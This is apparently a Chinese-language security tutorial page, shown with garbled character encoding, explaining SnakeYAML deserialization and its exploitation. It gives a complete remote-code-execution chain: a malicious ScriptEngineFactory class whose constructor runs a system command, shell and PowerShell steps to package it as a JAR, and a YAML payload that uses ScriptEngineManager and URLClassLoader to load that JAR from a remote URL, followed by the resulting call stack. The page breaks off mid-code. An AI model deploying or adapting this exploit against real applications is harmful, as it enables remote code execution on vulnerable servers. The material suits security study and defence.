<h3 id="YAML-â†’-å¼ºç±»å‹å¯¹è±¡"><a href="#YAML-â†’-å¼ºç±»å‹å¯¹è±¡" class="headerlink" title="YAML â†’ å¼ºç±»å‹å¯¹è±¡"></a>YAML â†’ å¼ºç±»å‹å¯¹è±¡</h3><p>åŠ è½½ YAML ä¸º Java å¯¹è±¡ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> yaml.load(<span class="string">&quot;!!User &#123;name: å¼ ä¸‰, age: 25&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(user);</span><br></pre></td></tr></table></figure></div>

<p><code>!!User &#123;name: å¼ ä¸‰, age: 25&#125;</code> ä¸­çš„ <code>!!User</code> ä¼š<strong>æ˜¾å¼å‘Šè¯‰è§£æå™¨</strong>ï¼šè¿™ä¸ªæ˜ å°„åº”æŒ‰ <code>User</code> ç±»å‹å¤„ç†ã€‚å¦‚æœæ²¡æœ‰æ˜¾å¼æ ‡ç­¾åˆ™ä¼šè¢«ååºåˆ—åŒ–ä¸º <code>java.util.LinkedHashMap</code> ç±»å‹å¯¹è±¡ã€‚</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>YAML çš„ç±»å‹æ ‡ç­¾ï¼ˆtagï¼‰ä¸åé¢å®é™…çš„é”®å€¼å¯¹å¿…é¡»æœ‰ç©ºæ ¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; while scanning a tag</span><br><span class="line"> in &#x27;string&#x27;, line 1, column 1:</span><br><span class="line">    !!User&#123;name: å¼ ä¸‰, age: 25&#125;</span><br><span class="line">    ^</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><strong>SnakeYAML è¿˜é¢å¤–çº¦å®š</strong>ï¼šå¦‚æœæ ‡ç­¾çœ‹èµ·æ¥åƒä¸€ä¸ª <strong>Java ç±»å</strong>ï¼ˆä¾‹å¦‚ <code>!!com.example.User</code> æˆ– <code>!!User</code>ï¼‰ï¼Œå®ƒä¼šå°è¯•ç”¨è¿™ä¸ªç±»æ¥æ„é€ å¯¹è±¡ã€‚å› æ­¤æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ä¸ºï¼š</p>
<ol>
<li><p>é¦–å…ˆè°ƒç”¨ç±»çš„<strong>æ— å‚æ„é€ å‡½æ•°</strong>å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœæ‰¾ä¸åˆ°æ— å‚æ„é€ å‡½æ•°å°±ä¼šæŠ›å‡ºå¦‚ä¸‹å¼‚å¸¸ï¼š</p>
<blockquote>
<p>NoSuchMethodException: User.<init>()<br>Canâ€™t construct a java object for tag:yaml.org,2002:User</p>
</blockquote>
</li>
<li><p>å¦‚æœå±æ€§æ˜¯ <code>public</code> ä¸”ä¸æ˜¯ <code>static</code> å˜é‡ï¼Œåˆ™ç›´æ¥é€šè¿‡<strong>åå°„èµ‹å€¼</strong>ã€‚è¿™é‡Œå¦‚æœæ˜¯ <code>static</code> å˜é‡åˆ™ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™ï¼š</p>
<blockquote>
<p>Exception in thread â€œmainâ€ Cannot create property&#x3D;age for JavaBean&#x3D;User{name&#x3D;â€™å¼ ä¸‰â€™, age&#x3D;0}</p>
</blockquote>
</li>
<li><p>å¦åˆ™å¯»æ‰¾å¯¹åº”çš„ setter å‡½æ•°èµ‹å€¼ï¼Œå¦‚æœæ‰¾ä¸åˆ°ä¼šæŠ›å‡ºå¦‚ä¸‹å¼‚å¸¸ï¼š</p>
<blockquote>
<p>Exception in thread â€œmainâ€ Cannot create property&#x3D;age for JavaBean&#x3D;User{name&#x3D;â€™å¼ ä¸‰â€™, age&#x3D;0}</p>
</blockquote>
<p> åˆ°è¿™ä¸€æ­¥ä¸ä¼šè·Ÿä¹‹å‰ä¸€æ ·å…³å¿ƒï¼šgetter å’Œ setter é½å…¨ï¼›å±æ€§æ˜¯å¦æ˜¯ <code>static</code>ï¼Œåªè¦èƒ½æ‰¾åˆ°å•ä¸ªå‚æ•°çš„ <code>public</code> ç±»å‹çš„ setter ä¸”ç±»å‹åŒ¹é…å°±ä¼šè°ƒç”¨èµ‹å€¼ã€‚</p>
</li>
</ol>
<p>å½“å†™æˆ <code>!!User [å¼ ä¸‰, 25]</code>ï¼ˆ<strong>æ ‡ç­¾ + åºåˆ—</strong>ï¼‰æ—¶ï¼ŒSnakeYAML ä¼šæŠŠåºåˆ—å…ƒç´ å…ˆæ„é€ æˆ Java å€¼ï¼Œç„¶å<strong>æŒ‰å‚æ•°ä¸ªæ•°ä¸ç±»å‹</strong>å»æ‰¾æ„é€ æ–¹æ³•ï¼ˆå¦‚ <code>User(String,int)</code>ï¼‰ã€‚å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„æœ‰å‚æ„é€ å‡½æ•°ä¼šæŠ›å‡ºå¦‚ä¸‹å¼‚å¸¸ï¼š</p>
<blockquote>
<p>Exception in thread â€œmainâ€ Canâ€™t construct a java object for tag:yaml.org,2002:User; exception&#x3D;No suitable constructor with 2 arguments found for class User</p>
</blockquote>
<h2 id="åˆ©ç”¨æ–¹æ³•-1"><a href="#åˆ©ç”¨æ–¹æ³•-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><p>æ ¹æ®å‰é¢å¯¹ SnakeYaml çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ SnakeYaml ååºåˆ—åŒ–è°ƒä»»æ„æ»¡è¶³æ¡ä»¶ setter å’Œæ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°å¯æ§ã€‚</p>
<h3 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h3><p><code>javax.script.ScriptEngineManager</code> æ˜¯ JSR-223ï¼ˆJava è„šæœ¬ APIï¼‰çš„â€œå¼•æ“ç®¡ç†å™¨â€ã€‚<strong>å®ƒçš„èŒè´£</strong>å°±æ˜¯æ‰¾åˆ°ç³»ç»Ÿé‡Œçš„è„šæœ¬å¼•æ“ï¼ˆNashornã€Rhinoã€Groovyã€Pythonâ€¦â€¦ï¼‰ï¼Œå¹¶æŒ‰åå­—&#x2F;åç¼€è¿”å› <code>ScriptEngine</code>ã€‚</p>
<p>è¿™é‡Œ <code>ScriptEngineManager</code> çš„â€œæ’ä»¶å‘ç°â€ç”¨çš„æ˜¯ <strong>SPIï¼ˆService Provider Interfaceï¼‰</strong>æœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ç§â€œ<strong>æ¥å£åœ¨è¿™ã€å®ç°ç”±å¤–éƒ¨æä¾›</strong>â€çš„çº¦å®šã€‚Java ç”¨ <code>ServiceLoader</code> æ¥åšâ€œåœ¨ç±»è·¯å¾„ä¸Š<strong>è‡ªåŠ¨å‘ç°å®ç°</strong>å¹¶<strong>å®ä¾‹åŒ–</strong>â€ï¼š</p>
<ul>
<li><strong>æœåŠ¡æ¥å£</strong>ï¼šä¸€ç»„ APIï¼ˆæ¯”å¦‚ <code>javax.script.ScriptEngineFactory</code>ï¼‰ã€‚</li>
<li><strong>æœåŠ¡æä¾›è€… JAR</strong>ï¼šæŠŠå®ç°ç±»ï¼ˆæ¯”å¦‚ <code>com.foo.MyEngineFactory</code>ï¼‰æ‰“è¿› JARï¼Œå¹¶ä¸”åœ¨ <strong><code>META-INF/services/&lt;æœåŠ¡æ¥å£å…¨å&gt;</code></strong> è¿™ä¸ªæ–‡ä»¶é‡Œ<strong>åˆ—å‡º</strong>å®ç°ç±»çš„<strong>å…¨é™å®šå</strong>ã€‚</li>
<li><strong>å‘ç°ä¸å®ä¾‹åŒ–</strong>ï¼šåº”ç”¨è°ƒç”¨ <code>ServiceLoader.load(æ¥å£, æŸä¸ªClassLoader)</code>ï¼›<code>ServiceLoader</code> ä¼šç”¨é‚£ä¸ª <code>ClassLoader</code> æ‰¾åˆ°æ‰€æœ‰ <code>META-INF/services/...</code> æ–‡ä»¶ â†’ è¯»æ¯ä¸€è¡Œç±»å â†’ <strong>åŠ è½½ç±»</strong> â†’ <strong>new ä¸€ä¸ª</strong>ï¼ˆè¦æ±‚<strong>æ— å‚æ„é€ </strong>ï¼‰ã€‚</li>
</ul>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€  <code>ScriptEngineManager</code> payloadï¼Œåˆ©ç”¨ SPI æœºåˆ¶é€šè¿‡ <code>URLClassLoader</code> è¿œç¨‹åŠ è½½æ¶æ„å­—èŠ‚ç æ–‡ä»¶ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªä¾› <code>ScriptEngineManager</code> åŠ è½½çš„æ¶æ„ JAR åŒ…ï¼Œå¹¶ä¸” JAR åŒ…ä¸­çš„è·¯å¾„éœ€è¦æŒ‰ç…§ä¸‹é¢è¿™æ ·æ„é€ ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acme-engine.jar</span><br><span class="line">â”œâ”€ META-INF/</span><br><span class="line">â”‚  â””â”€ services/</span><br><span class="line">â”‚     â””â”€ javax.script.ScriptEngineFactory   # æ–‡ä»¶å†…å®¹ï¼šcom.acme.MyEngineFactory</span><br><span class="line">â””â”€ com/</span><br><span class="line">   â””â”€ acme/</span><br><span class="line">      â””â”€ MyEngineFactory.class</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>META-INF/services/javax.script.ScriptEngineFactory</code> å‘Šè¯‰ <code>ServiceLoader</code>ï¼ˆ<code>ScriptEngineManager</code> å†…éƒ¨ä½¿ç”¨å®ƒï¼‰æœ‰å“ªäº› <code>ScriptEngineFactory</code> æä¾›è€…ã€‚æ–‡ä»¶å†…å®¹æ¯è¡Œä¸€ä¸ª<strong>å®ç°ç±»çš„å…¨é™å®šå</strong>ï¼Œå¿½ç•¥ç©ºè¡Œ&#x2F;ç©ºç™½ï¼›<code>#</code> ä¹‹åä¸ºæ³¨é‡Šï¼›<strong>é‡å¤æ¡ç›®å¿½ç•¥</strong>ï¼›å¹¶ä¸”<strong>æä¾›è€…ç±»å¿…é¡»æœ‰â€œæ— å‚æ„é€ å‡½æ•°â€</strong>ï¼Œä»¥ä¾¿åŠ è½½æ—¶å®ä¾‹åŒ–ã€‚</p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.acme.MyEngineFactory</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>com/acme/MyEngineFactory.class</code> æ˜¯çœŸæ­£çš„â€œæä¾›è€…ç±»â€ï¼ˆ**å®ç° <code>javax.script.ScriptEngineFactory</code>**ï¼‰ï¼Œç”± <code>ScriptEngineManager</code> é€šè¿‡ <code>ServiceLoader</code> å‘ç°å¹¶ <strong>åŠ è½½ + å®ä¾‹åŒ–</strong>ã€‚è¿™è¦æ±‚ <code>ScriptEngineFactory</code> çš„å®ç°ç±» <code>MyEngineFactory</code>ï¼š</p>
<ul>
<li><code>public</code>ã€<strong>éæŠ½è±¡</strong>ï¼›</li>
<li><strong>public æ— å‚æ„é€ </strong>ï¼ˆç”± <code>ServiceLoader</code> åå°„åˆ›å»ºï¼‰ï¼›</li>
<li>æ”¾åœ¨å’ŒåŒ…åä¸€è‡´çš„è·¯å¾„ä¸‹ï¼ˆ<code>com/acme/...</code>ï¼‰ï¼Œå¹¶èƒ½è¢«ç”¨äºå‘ç°çš„ <strong>ClassLoader</strong> è®¿é—®åˆ°ã€‚</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.acme;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>è¦æƒ³ç¼–è¯‘ä¸Šè¿° JAR åŒ…ï¼Œé¦–å…ˆéœ€è¦æŒ‰ç…§ä¸‹é¢è¿™ä¸ªæ ¼å¼åˆ›å»ºæºç ç›®å½•ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">project/</span><br><span class="line">â”œâ”€ src/</span><br><span class="line">â”‚  â””â”€ com/acme/MyEngineFactory.java      // å®ç° ScriptEngineFactory</span><br><span class="line">â””â”€ resources/</span><br><span class="line">   â””â”€ META-INF/services/javax.script.ScriptEngineFactory</span><br></pre></td></tr></table></figure></div>

<p>åˆ›å»ºå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>powershellï¼š</p>
  <div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> project\src\com\acme</span><br><span class="line"><span class="built_in">mkdir</span> project\resources\META-INF\services</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>bashï¼š</p>
  <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p project/src/com/acme project/resources/META-INF/services</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>ç„¶åå°†å…¶æ‰“åŒ…æˆ JAR åŒ…ï¼š</p>
<ul>
<li><p>powershellï¼š</p>
  <div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env:JAVA_HOME</span>=<span class="string">&quot;C:\Program Files\Java\jdk1.8.0_65&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) å¤åˆ¶ SPI æ–‡ä»¶åˆ°ç¼–è¯‘è¾“å‡ºï¼ˆout\classesï¼‰çš„ç›¸åŒè·¯å¾„</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-ItemType</span> Directory <span class="literal">-Force</span> out\classes\META<span class="literal">-INF</span>\services | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Copy-Item</span> <span class="literal">-Force</span> `</span><br><span class="line">  resources\META<span class="literal">-INF</span>\services\javax.script.ScriptEngineFactory `</span><br><span class="line">  out\classes\META<span class="literal">-INF</span>\services\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) æ‰“åŒ…ï¼ˆæŠŠ out\classes çš„å†…å®¹ä½œä¸º JAR æ ¹ï¼‰</span></span><br><span class="line">&amp; <span class="string">&quot;<span class="variable">$env:JAVA_HOME</span>\bin\jar.exe&quot;</span> <span class="literal">-cvf</span> acme<span class="literal">-engine</span>.jar <span class="literal">-C</span> out\classes .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) æ ¡éªŒ</span></span><br><span class="line">&amp; <span class="string">&quot;<span class="variable">$env:JAVA_HOME</span>\bin\jar.exe&quot;</span> tf acme<span class="literal">-engine</span>.jar</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>bashï¼š</p>
  <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) å¤åˆ¶ SPI æ–‡ä»¶åˆ°ç¼–è¯‘è¾“å‡ºï¼ˆout/classesï¼‰çš„ç›¸åŒè·¯å¾„</span></span><br><span class="line"><span class="built_in">mkdir</span> -p out/classes/META-INF/services out/classes</span><br><span class="line"><span class="built_in">cp</span> -f resources/META-INF/services/javax.script.ScriptEngineFactory \</span><br><span class="line">      out/classes/META-INF/services/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) ç¼–è¯‘æºç åˆ° out/classes ç›®å½•</span></span><br><span class="line">javac -encoding UTF-8 -d out/classes src/com/acme/MyEngineFactory.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) æ‰“åŒ…ï¼ˆæŠŠ out/classes çš„å†…å®¹ä½œä¸º JAR æ ¹ï¼‰</span></span><br><span class="line">jar -cvf acme-engine.jar -C out/classes .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) æ ¡éªŒ</span></span><br><span class="line">jar tf acme-engine.jar</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>ç„¶åç”¨ SnakeYaml ååºåˆ—åŒ–ä¸‹é¢è¿™æ®µ Yaml å†…å®¹å°±å¯ä»¥è¿œç¨‹åŠ è½½ JAR åŒ…å¹¶æ‰§è¡Œ <code>MyEngineFactory.class</code> ä¸­çš„ä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">yamlString</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;  [ !!java.net.URLClassLoader\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;      [[ !!java.net.URL [\&quot;http://127.0.0.1:9999/acme-engine.jar\&quot;] ]]\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;  ]&quot;</span>;</span><br><span class="line">yaml.load(yamlString);</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šè¿°ååºåˆ—åŒ–çš„ Yaml å†…å®¹æœ¬è´¨ä¸Šæ˜¯åµŒå¥—è°ƒç”¨äº†ä¸‰ä¸ªç±»çš„æ„é€ å‡½æ•°ï¼š</p>
<ol>
<li><p>è§£ææœ€å†…å±‚ï¼š<code>!!java.net.URL [&quot;http://.../acme-engine.jar&quot;]</code><br>â†’ æ‰¾åˆ° <code>URL(String)</code> æ„é€ å™¨ â†’ å¾—åˆ°ä¸€ä¸ª <code>URL</code> å®ä¾‹ã€‚</p>
</li>
<li><p>è§£æä¸­é—´å±‚ï¼š<code>!!java.net.URLClassLoader [[ &lt;URL&gt; ]]</code></p>
<p>â†’ å†…å±‚ <code>[]</code> å°† <code>URL</code> è½¬æ¢æˆæ•°ç»„å½¢å¼çš„ <code>URL[]</code>ï¼›</p>
<p>â†’ å¤–å±‚ <code>[]</code> è°ƒç”¨æ„é€ å‡½æ•° <code>URLClassLoader(URL[])</code> â†’ å¾—åˆ°ä¸€ä¸ª <code>URLClassLoader</code>ï¼Œå…¶æœç´¢è·¯å¾„åŒ…å« <code>&quot;http://.../acme-engine.jar&quot;</code>ã€‚</p>
</li>
<li><p>è§£ææœ€å¤–å±‚ï¼š<code>!!javax.script.ScriptEngineManager [ &lt;URLClassLoader&gt; ]</code><br>â†’ åŒ¹é…åˆ° <code>ScriptEngineManager(ClassLoader)</code> æ„é€ å™¨ â†’ å¼€å§‹æ‰§è¡Œ SEM çš„æ„é€ å‡½æ•°ã€‚</p>
</li>
</ol>
<p>å¯¹äºæœ€å¤–å±‚çš„ <code>ScriptEngineManager</code>ï¼Œæœ‰å¦‚ä¸‹è°ƒç”¨æ ˆï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.Runtime.exec(Runtime.java:347)</span><br><span class="line">at com.acme.MyEngineFactory.&lt;init&gt;(MyEngineFactory.java:10)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class="line">at java.lang.Class.newInstance(Class.java:442)</span><br><span class="line">at java.util.ServiceLoader$LazyIterator.nextService(ServiceLoader.java:380)</span><br><span class="line">at java.util.ServiceLoader$LazyIterator.next(ServiceLoader.java:404)</span><br><span class="line">at java.util.ServiceLoader$1.next(ServiceLoader.java:480)</span><br><span class="line">at javax.script.ScriptEngineManager.initEngines(ScriptEngineManager.java:122)</span><br><span class="line">at javax.script.ScriptEngineManager.init(ScriptEngineManager.java:84)</span><br><span class="line">at javax.script.ScriptEngineManager.&lt;init&gt;(ScriptEngineManager.java:75)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructSequence.construct(Constructor.java:570)</span><br><span class="line">at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:331)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:229)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:219)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:173)</span><br><span class="line">at org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:157)</span><br><span class="line">at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:490)</span><br><span class="line">at org.yaml.snakeyaml.Yaml.load(Yaml.java:416)</span><br><span class="line">at Main.main(Main.java:10)</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>javax.script.ScriptEngineManager#initEngines</code> å‡½æ•°é¦–å…ˆè°ƒç”¨ <code>getServiceLoader</code> å‡½æ•°æ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„ <code>URLClassLoader</code> è¿œç¨‹åŠ è½½ JAR åŒ…å¹¶æŒ‰ SPI è§„åˆ™åŠ è½½å…¶ä¸­çš„ <code>ScriptEngineFactory</code>ã€‚åç»­éå†æ“ä½œè§¦å‘ç±»çš„å®ä¾‹åŒ–æ‰§è¡Œä»£ç ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 